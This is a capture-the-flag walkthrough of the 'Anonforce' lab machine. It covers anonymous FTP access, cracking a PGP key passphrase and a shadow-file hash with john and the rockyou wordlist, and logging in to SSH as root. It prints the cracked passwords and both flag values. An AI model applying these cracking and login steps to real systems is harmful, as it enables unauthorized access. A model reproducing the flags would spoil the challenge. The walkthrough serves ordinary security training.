# Anonforce

## Description

boot2root machine for FIT and bsides guatemala CTF

Read user.txt and root.txt

## Initial Scan

Let's start with an Nmap scan. The scan reveals two open ports:
* 21 ftp
* 22 ssh

~~~
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x    2 0        0            4096 Aug 11  2019 bin
| drwxr-xr-x    3 0        0            4096 Aug 11  2019 boot
| drwxr-xr-x   17 0        0            3700 Oct 24 02:09 dev
| drwxr-xr-x   85 0        0            4096 Aug 13  2019 etc
| drwxr-xr-x    3 0        0            4096 Aug 11  2019 home
| lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img -> boot/initrd.img-4.4.0-157-generic
| lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img.old -> boot/initrd.img-4.4.0-142-generic
| drwxr-xr-x   19 0        0            4096 Aug 11  2019 lib
| drwxr-xr-x    2 0        0            4096 Aug 11  2019 lib64
| drwx------    2 0        0           16384 Aug 11  2019 lost+found
| drwxr-xr-x    4 0        0            4096 Aug 11  2019 media
| drwxr-xr-x    2 0        0            4096 Feb 26  2019 mnt
| drwxrwxrwx    2 1000     1000         4096 Aug 11  2019 notread [NSE: writeable]
| drwxr-xr-x    2 0        0            4096 Aug 11  2019 opt
| dr-xr-xr-x  100 0        0               0 Oct 24 02:09 proc
| drwx------    3 0        0            4096 Aug 11  2019 root
| drwxr-xr-x   18 0        0             540 Oct 24 02:09 run
| drwxr-xr-x    2 0        0           12288 Aug 11  2019 sbin
| drwxr-xr-x    3 0        0            4096 Aug 11  2019 srv
| dr-xr-xr-x   13 0        0               0 Oct 24 02:09 sys
|_Only 20 shown. Use --script-args ftp-anon.maxlist=-1 to see all.
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.2.86
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8a:f9:48:3e:11:a1:aa:fc:b7:86:71:d0:2a:f6:24:e7 (RSA)
|   256 73:5d:de:9a:88:6e:64:7a:e1:87:ec:65:ae:11:93:e3 (ECDSA)
|_  256 56:f9:9f:24:f1:52:fc:16:b7:7b:a3:e2:4f:17:b4:ea (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
~~~

## FTP

Let's start with the FTP service, since anonymous login is allowed. After logging into the FTP, we can see all the existing files on the machine. We don't have the permission to download most of them:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Anonforce/files]
└─$ ftp $IP                                                                                
Connected to 10.10.147.174.
220 (vsFTPd 3.0.3)
Name (10.10.147.174:user): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x   23 0        0            4096 Aug 11  2019 .
drwxr-xr-x   23 0        0            4096 Aug 11  2019 ..
drwxr-xr-x    2 0        0            4096 Aug 11  2019 bin
drwxr-xr-x    3 0        0            4096 Aug 11  2019 boot
drwxr-xr-x   17 0        0            3700 Oct 24 02:09 dev
drwxr-xr-x   85 0        0            4096 Aug 13  2019 etc
drwxr-xr-x    3 0        0            4096 Aug 11  2019 home
lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img -> boot/initrd.img-4.4.0-157-generic
lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img.old -> boot/initrd.img-4.4.0-142-generic
drwxr-xr-x   19 0        0            4096 Aug 11  2019 lib
drwxr-xr-x    2 0        0            4096 Aug 11  2019 lib64
drwx------    2 0        0           16384 Aug 11  2019 lost+found
drwxr-xr-x    4 0        0            4096 Aug 11  2019 media
drwxr-xr-x    2 0        0            4096 Feb 26  2019 mnt
drwxrwxrwx    2 1000     1000         4096 Aug 11  2019 notread
drwxr-xr-x    2 0        0            4096 Aug 11  2019 opt
dr-xr-xr-x   91 0        0               0 Oct 24 02:09 proc
drwx------    3 0        0            4096 Aug 11  2019 root
drwxr-xr-x   18 0        0             540 Oct 24 02:09 run
drwxr-xr-x    2 0        0           12288 Aug 11  2019 sbin
drwxr-xr-x    3 0        0            4096 Aug 11  2019 srv
dr-xr-xr-x   13 0        0               0 Oct 24 02:09 sys
drwxrwxrwt    9 0        0            4096 Oct 24 02:17 tmp
drwxr-xr-x   10 0        0            4096 Aug 11  2019 usr
drwxr-xr-x   11 0        0            4096 Aug 11  2019 var
lrwxrwxrwx    1 0        0              30 Aug 11  2019 vmlinuz -> boot/vmlinuz-4.4.0-157-generic
lrwxrwxrwx    1 0        0              30 Aug 11  2019 vmlinuz.old -> boot/vmlinuz-4.4.0-142-generic
226 Directory send OK.
~~~

## User Flag

Thankfully, we have permission to download the user flag. Just head to `/home/melodias` and then, download the flag using `get` command:

~~~
ftp> cd /home/melodias
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 1000     1000           33 Aug 11  2019 user.txt
226 Directory send OK.
ftp> get user.txt
local: user.txt remote: user.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for user.txt (33 bytes).
226 Transfer complete.
33 bytes received in 0.00 secs (259.8916 kB/s)
~~~

Now we can read the file on our machine:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Anonforce/files]
└─$ cat user.txt   
606083fd33beb1284fc51f411a706af8
~~~

user.txt: `606083fd33beb1284fc51f411a706af8`

## Obtaining credentials

Now we need to escalate to a more privileged user or even root to obtain the root flag. If you look closely at the folders, there is a folder called `/notread`. If you list the files inside it, you can see a pgp file which is an encrypted file and an asc file which is an armored ASCII file used by Pretty Good Privacy (PGP) which is basicly a key:

~~~
ftp> cd /notread
250 Directory successfully changed.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 1000     1000         4096 Aug 11  2019 .
drwxr-xr-x   23 0        0            4096 Aug 11  2019 ..
-rwxrwxrwx    1 1000     1000          524 Aug 11  2019 backup.pgp
-rwxrwxrwx    1 1000     1000         3762 Aug 11  2019 private.asc
226 Directory send OK.
~~~


### Decrypting backup.pgp

After downloading them, we should use `private.asc` to decrypt `backup.pgp`, but first we should crack the password of the key. I used an addintional tool called `gpg2john` to change the format, to a crackable format for `john`. Then I started cracking it using rockyou wordlist. You can see the steps bellow:

~~~
$ gpg2john private.asc > key.hash
$ john --wordlist=/usr/share/wordlists/rockyou.txt key.hash
~~~

The password for the key: `xbox360`

Now that we have the password for the key, we can decrypt the pgp file. Follow the steps:

~~~
$ gpg --import private.asc
~~~

Now you enter the password, then:

~~~
$ gpg --decrypt-file backup.pgp
~~~

Then you enter the password again and the backup file is decrypted.

### Cracking Password Hashes

After taking a look at the content of this file, I realized that it is a copy of the `shadow` file which keeps the password hashes in a linux machine. We have the password hashes for the root and the user `melodias`. Let's try to crack them using john and rockyou wordlist:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Anonforce/files]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt backup  
Warning: only loading hashes of type "sha512crypt", but also saw type "md5crypt"
Use the "--format=md5crypt" option to force loading hashes of that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
hikari           (root)
1g 0:00:00:04 DONE (2021-10-24 06:53) 0.2159g/s 1548p/s 1548c/s 1548C/s 111111111111111..droopy
Use the "--show" option to display all of the cracked passwords reliably
Session completed
~~~

root's password: `hikari`

Amazing! We have root's password, so we can directly connect to the target machine as root.

## Root Flag

Let's connect to the machin via SSH and read the root flag:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Anonforce/files]
└─$ ssh root@$IP
root@10.10.147.174's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-157-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

root@ubuntu:~# id
uid=0(root) gid=0(root) groups=0(root)
root@ubuntu:~# ls
root.txt
root@ubuntu:~# cat root.txt 
f706456440c7af4187810c31c6cebdce
~~~

root.txt: `f706456440c7af4187810c31c6cebdce`

# D0N3! ; )

Thanks to the creator(s)!

Hope you had fun!

And have a good one! : )